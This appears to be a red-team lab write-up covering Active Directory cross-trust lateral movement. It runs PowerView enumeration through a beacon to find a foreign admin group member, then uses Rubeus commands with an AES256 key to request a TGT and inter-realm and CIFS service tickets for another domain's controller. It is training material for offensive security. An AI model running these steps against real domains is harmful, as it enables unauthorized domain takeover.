dev.cyberbotic.io also has a one-way inbound trust with dev-studio.com.
```
beacon> powershell Get-DomainTrust

SourceName      : dev.cyberbotic.io
TargetName      : dev-studio.com
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : 
TrustDirection  : Inbound
WhenCreated     : 8/16/2022 9:52:37 AM
WhenChanged     : 8/16/2022 9:52:37 AM
```
We can enumerate the foreign domain across the trust.
```
beacon> powershell Get-DomainComputer -Domain dev-studio.com -Properties DnsHostName

dnshostname      
-----------      
dc.dev-studio.com
```
`Get-DomainForeignGroupMember` will enumerate any groups that contain users outside of its domain and return its members.
```
beacon> powershell Get-DomainForeignGroupMember -Domain dev-studio.com

GroupDomain             : dev-studio.com
GroupName               : Administrators
GroupDistinguishedName  : CN=Administrators,CN=Builtin,DC=dev-studio,DC=com
MemberDomain            : dev-studio.com
MemberName              : S-1-5-21-569305411-121244042-2357301523-1120
MemberDistinguishedName : CN=S-1-5-21-569305411-121244042-2357301523-1120,CN=ForeignSecurityPrincipals,DC=dev-studio,DC=com
```
This output shows that there's a member of the domain's built-in Administrators group who is not part of dev-studio.com. The MemberName field contains a SID that can be resolved in our current domain.
```
beacon> powershell ConvertFrom-SID S-1-5-21-569305411-121244042-2357301523-1120

DEV\Studio Admins
```
Get the members of that group
```
beacon> powershell Get-DomainGroupMember -Identity "Studio Admins" | select MemberName

MemberName
----------
nlamb
```

Request tgt for that user
```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:nlamb /domain:dev.cyberbotic.io /aes256:a779fa8afa28d66d155d9d7c14d394359c5d29a86b6417cb94269e2e84c4cee4 /nowrap
```
Request tgs from our domain (dc) to target domain (service)
```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgs /service:krbtgt/dev-studio.com /domain:dev.cyberbotic.io /dc:dc-2.dev.cyberbotic.io /ticket:doIFwj[...]MuaW8= /nowrap
```
Request tgs for target machine
```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgs /service:cifs/dc.dev-studio.com /domain:dev-studio.com /dc:dc.dev-studio.com /ticket:doIFoz[...]NPTQ== /nowrap
```
